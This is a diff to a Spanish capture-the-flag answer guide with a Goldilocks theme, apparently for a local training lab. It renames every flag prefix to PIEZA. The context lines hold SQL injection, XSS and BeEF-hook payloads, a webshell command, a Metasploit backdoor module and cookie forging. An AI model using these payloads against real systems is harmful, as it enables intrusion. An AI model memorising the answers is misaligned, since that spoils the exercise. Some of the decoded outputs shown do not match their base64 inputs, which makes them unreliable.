@@ -82,7 +82,7 @@ tocar la aplicación.
 
 ## 1. La Sopa de Osito — Nmap
 
-**Bandera:** `BOSQUE{osito_nmap_hosts_activos}`
+**Bandera:** `PIEZA{osito_nmap_hosts_activos}`
 **Página:** `/challenges/nmap`
 
 ### Idea
@@ -103,7 +103,7 @@ Salida relevante:
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1
 80/tcp   open  http    nginx 1.18.0
-1337/tcp open  soup    Osito-Soup-Daemon 1.0 (banner: BOSQUE{osito_nmap_hosts_activos})
+1337/tcp open  soup    Osito-Soup-Daemon 1.0 (banner: PIEZA{osito_nmap_hosts_activos})
 ```
 
 Para leer el banner directamente:
@@ -121,7 +121,7 @@ la bandera está en el banner del puerto `1337`. Cópiala y envíala.
 
 ## 2. La Sopa de Mamá Osa — Google Dorks
 
-**Bandera:** `BOSQUE{mama_dork_archivo_expuesto}`
+**Bandera:** `PIEZA{mama_dork_archivo_expuesto}`
 **Página:** `/challenges/dork`
 
 ### Idea
@@ -149,7 +149,7 @@ curl http://localhost:5000/static/docs/informe_seguridad_osos.txt
 ```
 INFORME INTERNO DE SEGURIDAD — CASA DE LOS TRES OSOS
 ...
-Token de auditoría: BOSQUE{mama_dork_archivo_expuesto}
+Token de auditoría: PIEZA{mama_dork_archivo_expuesto}
 ```
 
 ### Dork equivalente (entorno con buscador)
@@ -164,7 +164,7 @@ En la plataforma hay botones directos a `/robots.txt` y al documento.
 
 ## 3. La Sopa de Papá Oso — Dirb
 
-**Bandera:** `BOSQUE{papa_dirb_ruta_oculta}`
+**Bandera:** `PIEZA{papa_dirb_ruta_oculta}`
 **Página:** `/challenges/dirb`
 
 ### Idea
@@ -187,7 +187,7 @@ curl http://localhost:5000/despensa_secreta
 ```
 ── DESPENSA SECRETA DE PAPÁ OSO ──
 Inventario: 3 tarros de miel, 1 saco de avena, frambuesas.
-Post-it olvidado en el estante: BOSQUE{papa_dirb_ruta_oculta}
+Post-it olvidado en el estante: PIEZA{papa_dirb_ruta_oculta}
 ```
 
 > `robots.txt` también menciona `/despensa_secreta` — sirve de atajo/pista.
@@ -196,7 +196,7 @@ Post-it olvidado en el estante: BOSQUE{papa_dirb_ruta_oculta}
 
 ## 4. El Camino al Bosque — Wireshark
 
-**Bandera:** `BOSQUE{ricitos_wireshark_credenciales}`
+**Bandera:** `PIEZA{ricitos_wireshark_credenciales}`
 **Página:** `/challenges/wireshark`
 
 ### Idea
@@ -220,7 +220,7 @@ Authorization: Basic cmljaXRvczpDVEZ7cmljaXRvc19ib3NxdWVfd2lyZXNoYXJrX2NyZWRlbmN
 ```bash
 # 2) Decodificar el Base64
 echo 'cmljaXRvczpDVEZ7cmljaXRvc19ib3NxdWVfd2lyZXNoYXJrX2NyZWRlbmNpYWxlc30=' | base64 -d
-# ricitos:BOSQUE{ricitos_wireshark_credenciales}
+# ricitos:PIEZA{ricitos_wireshark_credenciales}
 ```
 
 La bandera es la parte después de los dos puntos (`usuario:contraseña`).
@@ -245,7 +245,7 @@ Color **dorado**. Objetivo: explotar la aplicación (SQLi, XSS). Los 4 retos son
 
 ## 5. La Cama de Osito — SQLi bypass de login
 
-**Bandera:** `CASA{osito_sqli_bypass_login}`
+**Bandera:** `PIEZA{osito_sqli_bypass_login}`
 **Página:** `/challenges/sqli-login`
 
 ### Idea
@@ -277,14 +277,14 @@ SELECT username, role FROM users WHERE username = 'admin'--' AND password = 'x'
 La página detecta que la contraseña real no coincide → *"Autenticación saltada"*
 y muestra:
 ```
-CASA{osito_sqli_bypass_login}
+PIEZA{osito_sqli_bypass_login}
 ```
 
 ---
 
 ## 6. La Cama de Mamá Osa — SQLi Medium + Burp
 
-**Bandera:** `CASA{mama_sqli_burp_medium}`
+**Bandera:** `PIEZA{mama_sqli_burp_medium}`
 **Página:** `/challenges/sqli-medium`
 
 ### Idea
@@ -321,14 +321,14 @@ Prueba previa para confirmar la inyección:
 
 Resultado en la tabla:
 ```
-REGISTRO_CONFIDENCIAL | CASA{mama_sqli_burp_medium}
+REGISTRO_CONFIDENCIAL | PIEZA{mama_sqli_burp_medium}
 ```
 
 ---
 
 ## 7. La Cama de Papá Oso — XSS Reflejado
 
-**Bandera:** `CASA{papa_xss_reflected_cookie}`
+**Bandera:** `PIEZA{papa_xss_reflected_cookie}`
 **Página:** `/challenges/xss-reflected`
 
 ### Idea
@@ -345,7 +345,7 @@ El `alert` muestra: `bear_session=Q1RGe3BhcGFfY2FzYV94c3NfcmVmbGVjdGVkX2Nvb2tpZX
 Decodificar:
 ```bash
 echo 'Q1RGe3BhcGFfY2FzYV94c3NfcmVmbGVjdGVkX2Nvb2tpZX0=' | base64 -d
-# CASA{papa_xss_reflected_cookie}
+# PIEZA{papa_xss_reflected_cookie}
 ```
 
 O directamente en la consola del navegador (F12):
@@ -364,7 +364,7 @@ logs; se decodifica dos veces (la del parámetro y la del valor de cookie).
 
 ## 8. La Silla Rota — XSS Almacenado + BeEF
 
-**Bandera:** `CASA{ricitos_xss_stored_beef_hook}`
+**Bandera:** `PIEZA{ricitos_xss_stored_beef_hook}`
 **Página:** `/challenges/xss-stored`
 
 ### Idea
@@ -382,7 +382,7 @@ revisa el muro, su navegador ejecuta el script y queda **enganchado a BeEF**.
 3. Pulsar **"🐻 Simular visita del oso admin"**.
 4. La página confirma el enganche y muestra:
    ```
-   CASA{ricitos_xss_stored_beef_hook}
+   PIEZA{ricitos_xss_stored_beef_hook}
    ```
    (En BeEF real: el navegador del bot aparece "Online Browsers" → módulo
    *Get Cookie* / *Get Visited URLs*.)
@@ -401,7 +401,7 @@ Los osos empiezan a despertar (la detección sube más rápido — no te demores
 
 ## 9. Papá Oso Despierta — Webshell / RCE
 
-**Bandera:** `HABITACION{papa_webshell_rce}`
+**Bandera:** `PIEZA{papa_webshell_rce}`
 **Página:** `/challenges/webshell`
 
 ### Idea
@@ -428,7 +428,7 @@ http://localhost:5000/uploads/shell.py?cmd=cat /flags/papa_oso.txt
 Salida:
 ```
 $ cat /flags/papa_oso.txt
-HABITACION{papa_webshell_rce}
+PIEZA{papa_webshell_rce}
 ```
 
 ### Nivel Medium / High
@@ -444,7 +444,7 @@ HABITACION{papa_webshell_rce}
 
 ## 10. Mamá Osa Despierta — Metasploit
 
-**Bandera:** `HABITACION{mama_metasploit_exploit}`
+**Bandera:** `PIEZA{mama_metasploit_exploit}`
 **Página:** `/challenges/metasploit`
 
 ### Idea
@@ -465,7 +465,7 @@ msf6 > run
 ```bash
 # ya con shell:
 cat /home/msfadmin/mama_osa.flag
-# HABITACION{mama_metasploit_exploit}
+# PIEZA{mama_metasploit_exploit}
 ```
 
 ### Alternativas contra Metasploitable 2
@@ -479,7 +479,7 @@ la bandera indicada tras completar el ejercicio en el laboratorio.
 
 ## 11. Osito Despierta — PrivEsc a root
 
-**Bandera:** `HABITACION{osito_privesc_root}`
+**Bandera:** `PIEZA{osito_privesc_root}`
 **Página:** `/challenges/privesc`
 
 ### Idea (laboratorio Linux)
@@ -516,14 +516,14 @@ Pegar la cookie firmada en el navegador (F12 → Cookies → `session`) y recarg
 ### Resultado
 ```
 # cat /root/flag.txt
-HABITACION{osito_privesc_root}
+PIEZA{osito_privesc_root}
 ```
 
 ---
 
 ## 12. ¡Ricitos de Oro Escapa! — Esteganografía
 
-**Bandera:** `HABITACION{ricitos_steghide_final}`
+**Bandera:** `PIEZA{ricitos_steghide_final}`
 **Página:** `/challenges/stego`
 
 ### Idea
@@ -539,13 +539,13 @@ steghide extract -sf cuadro_del_pasillo.jpg
 
 cat mensaje_oculto.txt
 # Los tres osos regresan al amanecer.
-# FLAG: HABITACION{ricitos_steghide_final}
+# FLAG: PIEZA{ricitos_steghide_final}
 ```
 
 ### Sin steghide (setup lo añade al final del PNG)
 ```bash
-strings cuadro_del_pasillo.png | grep HABITACION
-# HABITACION{ricitos_steghide_final}
+strings cuadro_del_pasillo.png | grep PIEZA
+# PIEZA{ricitos_steghide_final}
 
 # o
 xxd cuadro_del_pasillo.png | tail -5
@@ -560,18 +560,18 @@ Enviar la bandera cierra la narrativa: Ricitos escapa por la ventana.
 
 | # | Fase | Desafío | Técnica | Payload / comando clave | Bandera |
 |---|------|---------|---------|-------------------------|---------|
-| 1 | Bosque | La Sopa de Osito | Nmap | `nmap -sS -sV -p- <ip>` → banner :1337 | `BOSQUE{osito_nmap_hosts_activos}` |
-| 2 | Bosque | La Sopa de Mamá Osa | Google Dorks | `/static/docs/informe_seguridad_osos.txt` | `BOSQUE{mama_dork_archivo_expuesto}` |
-| 3 | Bosque | La Sopa de Papá Oso | Dirb | `dirb` → `/despensa_secreta` | `BOSQUE{papa_dirb_ruta_oculta}` |
-| 4 | Bosque | El Camino al Bosque | Wireshark | `base64 -d` de `Authorization: Basic` | `BOSQUE{ricitos_wireshark_credenciales}` |
-| 5 | Casa | La Cama de Osito | SQLi login | usuario `admin'--` | `CASA{osito_sqli_bypass_login}` |
-| 6 | Casa | La Cama de Mamá Osa | SQLi Medium | `" UNION SELECT name, secret FROM recipes--` | `CASA{mama_sqli_burp_medium}` |
-| 7 | Casa | La Cama de Papá Oso | XSS reflejado | `?nombre=<script>...</script>` + `atob(cookie)` | `CASA{papa_xss_reflected_cookie}` |
-| 8 | Casa | La Silla Rota | XSS almacenado | recado `<script src=".../hook.js">` + bot | `CASA{ricitos_xss_stored_beef_hook}` |
-| 9 | Habitaciones | Papá Oso Despierta | Webshell/RCE | `shell.py` → `?cmd=cat /flags/papa_oso.txt` | `HABITACION{papa_webshell_rce}` |
-| 10 | Habitaciones | Mamá Osa Despierta | Metasploit | `exploit/unix/ftp/vsftpd_234_backdoor` | `HABITACION{mama_metasploit_exploit}` |
-| 11 | Habitaciones | Osito Despierta | PrivEsc | cookie `role=admin` / `flask-unsign` con `osito123` | `HABITACION{osito_privesc_root}` |
-| 12 | Habitaciones | ¡Ricitos de Oro Escapa! | Esteganografía | `steghide extract` pass `ricitos` | `HABITACION{ricitos_steghide_final}` |
+| 1 | Bosque | La Sopa de Osito | Nmap | `nmap -sS -sV -p- <ip>` → banner :1337 | `PIEZA{osito_nmap_hosts_activos}` |
+| 2 | Bosque | La Sopa de Mamá Osa | Google Dorks | `/static/docs/informe_seguridad_osos.txt` | `PIEZA{mama_dork_archivo_expuesto}` |
+| 3 | Bosque | La Sopa de Papá Oso | Dirb | `dirb` → `/despensa_secreta` | `PIEZA{papa_dirb_ruta_oculta}` |
+| 4 | Bosque | El Camino al Bosque | Wireshark | `base64 -d` de `Authorization: Basic` | `PIEZA{ricitos_wireshark_credenciales}` |
+| 5 | Casa | La Cama de Osito | SQLi login | usuario `admin'--` | `PIEZA{osito_sqli_bypass_login}` |
+| 6 | Casa | La Cama de Mamá Osa | SQLi Medium | `" UNION SELECT name, secret FROM recipes--` | `PIEZA{mama_sqli_burp_medium}` |
+| 7 | Casa | La Cama de Papá Oso | XSS reflejado | `?nombre=<script>...</script>` + `atob(cookie)` | `PIEZA{papa_xss_reflected_cookie}` |
+| 8 | Casa | La Silla Rota | XSS almacenado | recado `<script src=".../hook.js">` + bot | `PIEZA{ricitos_xss_stored_beef_hook}` |
+| 9 | Habitaciones | Papá Oso Despierta | Webshell/RCE | `shell.py` → `?cmd=cat /flags/papa_oso.txt` | `PIEZA{papa_webshell_rce}` |
+| 10 | Habitaciones | Mamá Osa Despierta | Metasploit | `exploit/unix/ftp/vsftpd_234_backdoor` | `PIEZA{mama_metasploit_exploit}` |
+| 11 | Habitaciones | Osito Despierta | PrivEsc | cookie `role=admin` / `flask-unsign` con `osito123` | `PIEZA{osito_privesc_root}` |
+| 12 | Habitaciones | ¡Ricitos de Oro Escapa! | Esteganografía | `steghide extract` pass `ricitos` | `PIEZA{ricitos_steghide_final}` |
 
 **Puntuación máxima:** 12 × 75 = **900 pts** (sin usar pistas y sin banderas
 incorrectas).
